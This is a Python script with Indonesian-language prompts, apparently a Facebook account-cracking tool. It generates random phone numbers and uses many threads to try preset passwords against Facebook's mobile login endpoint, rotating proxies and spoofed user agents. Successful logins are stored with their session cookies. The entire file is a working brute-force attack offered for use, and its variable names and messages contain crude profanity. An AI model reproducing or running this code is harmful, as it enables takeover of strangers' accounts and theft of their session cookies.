import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as kontol
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import datetime

try:
        import rich
except ImportError:
        print('* sedang menginstall modul rich')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('* sedang menginstall modul stdiomask')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('* sedang menginstall modul requests & mechanize')
	os.system('pip install requests && pip install mechanize')

pretty.install()
CON=sol()
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
user_agent=[]
sys.stdout.write('\x1b]2; (Simpel Tools) \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah')
prox=open('.prox.txt','r').read().splitlines()
for z in range(1000):
	xd=random.choice(["4","5","6","7","8","9"])
	build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
	a=random.choice(["4","5","6","7","8","9","10","11","12","13","9.0","9.0.1","6.0","6.2.1","4.0.2","5.0.2","6.0.1","7.0.1","7.0","8.1.0","4.4.4","6.0.3"])
	c=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','TQ3A'])
	d=random.randrange(111111,199999)
	e=random.choice(['010','011','012','013','014','015','016','017','018','019'])
	f=random.randrange(60,114)
	g=random.randrange(1111,9999)
	h=random.randrange(20,100)
	uaku2 =f'Mozilla/5.0 (Linux; Android {a}; Redmi Note {xd}A Prime Build/{c}.{d}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
	user_agent.append(uaku2)

sir = '\033[41m\x1b[1;97m'
S = '\x1b[0;00m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
Q = '\x1b[00m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
R = '\x1b[0;36m'
W = '\x1b[0;00m'
c = '\x1b[0;32m'
o = '\x1b[0;31m'
T = '\x1b[1;94m'
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T,P,p,S,I,C,Q,ff,G,i,mm,R,W,c,o,KU,HA])

nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"ok-{days}-{reall}-{year}.txt"
cpc = f"cp-{days}-{reall}-{year}.txt"

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow

def coli(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def clear():
	os.system('clear')
def back():
	menuku()

def menuku():
	clear()
	print(f'{x}1.crack nomor\n0.hasil crack')
	_____memek_____ = input(f'* pilih : ')
	if _____memek_____ in ['1']:Nomor()
	elif _____memek_____ in ['2']:Result()
	else:
		print(f' {P}└─{J} pilih yang benar ')
		back()
def File():
	try:
		fileX = input ('\n* enter file path : ') 
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		atur_id()
	except IOError:
		exit("\n* file %s not found"%(fileX))
def error():
	print(f' {P}└─{J} error in selecting features')
	time.sleep(4)
	back()
def Results():
	clear()
	print(f"{x}-" *40)
	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		print(f"{x}-" *40)
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		print(f"{x}-" *40)
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{J} pilih yang bener kontol ')
		back()
def Nomor():
	print()
	depan = input('* awalan nomor (contoh > 089) : ')
	if len(depan)==3:pass
	else:exit(f'* contoh awalan nomor 089')
	jumla = input('* jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A1 = depan
		B1 = rr(1111,9999)
		C1 = rr(1,9)
		D1 = f'{A1}{C1}-{str(rr(1111,9999))}-{str(B1)}'
		if D1 in id:pass
		else:id.append(D1+'|123456')
		print('\r* berhasil mengumpulkan %s nomor '%(len(id)),end='')
		sys.stdout.flush()
	atur_atur2()
def atur_atur2():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	psw()
def psw():
	global prog,des
	print("\n");prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as ngewee:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
# boleh ditambah pw asal jangan kebanyakan #
				pwv=[
						'kamu nanya',
						'kata sandi'
						]
				if 'crack' in method:ngewee.submit(crack,idf,pwv)
				else:ngewee.submit(crack,idf,pwv)
	print()
	print('-'*40)
	print(f'\r{A}[{ewe}±{A}] {P}crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
def UserAgent():
	q1=f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(59,119))}.0.{str(random.randint(2500,6999))}.{str(random.randint(99,299))} Safari/537.36 QIHU 360SE"
	w2=f"Mozilla/5.0 (Linux; Android {str(random.randint(6,16))}; Lenovo A358t Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(59,119))}.0.{str(random.randint(2500,6999))}.{str(random.randint(99,299))} Mobile Safari/537.36 MxBrowser/4.5.10.1300"
	e3=random.choice([q1,w2])
	return e3

def crack(idf,pwv):
	global loop,ok,cp
	emot = random.choice(["😄","😁","😆","😅","😂","🤣","😄","😁","😆","😅","😂","🤣"])
	prog.update(des,description=f'\r* {emot} {P}{(loop)}/{len(id)} ok:{H}{(ok)} {P}cp:{K}{(cp)}{x}')
	prog.advance(des)
	ua = UserAgent()
	ses = requests.Session()
	for pw in pwv:
		try:
			Head1 = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": ua})
			ress = ses.get('https://m.alpha.facebook.com/login.php?',headers = Head1).text
			Data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"', str(ress)).group(1),
				'li': re.search('name="li" value="(.*?)"', str(ress)).group(1),
				'try_number': 0,
				'unrecognized_tries': 0,
				'email': idf,
				'prefill_contact_point': idf,
				'prefill_source': 'browser_dropdown',
				'prefill_type': 'password',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point',
				'had_cp_prefilled': True,
				'had_password_prefilled': True,
				'is_smart_lock': False,
				'bi_xrwh': 0,
				'encpass': f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}",
				'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(ress)).group(1),
				'jazoest': re.search('name="jazoest" value="(\d+)"', str(ress)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'__dyn': '',
				'__csr': '',
				'__req': random.choice(['1','2','3','4','5']),
				'__a': re.search('"encrypted":"(.*?)"', str(ress)).group(1),
				'__user': 0
			}
			Head = {
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'sec-ch-ua-mobile': '?1',
				'Origin': 'https://m.alpha.facebook.com',
				'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'X-ASBD-ID': '129477',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': str(len((Data))),
				'sec-ch-ua-platform': '"Android"',
				'Sec-Fetch-Site': 'same-origin',
				'Referer': 'https://m.alpha.facebook.com/login.php?',
				'Host': 'm.alpha.facebook.com',
				'Sec-Fetch-Mode': 'cors',
				'Sec-Fetch-Dest': 'empty',
				'User-Agent':ua,
				'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				'Accept-Encoding': 'gzip, deflate, br',
				'viewport-width': '424'
			}
			ress2 = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers = Head, data = Data, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}* nomor : {H}{idf}\n{P}* sandi : {H}{pw}\n{P}* kukis : {H}{cookie}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+cookie+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{P}* nomor : {K}{idf}\n{P}* sandi : {K}{pw}\n{P}* ugent : {K}{ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menuku()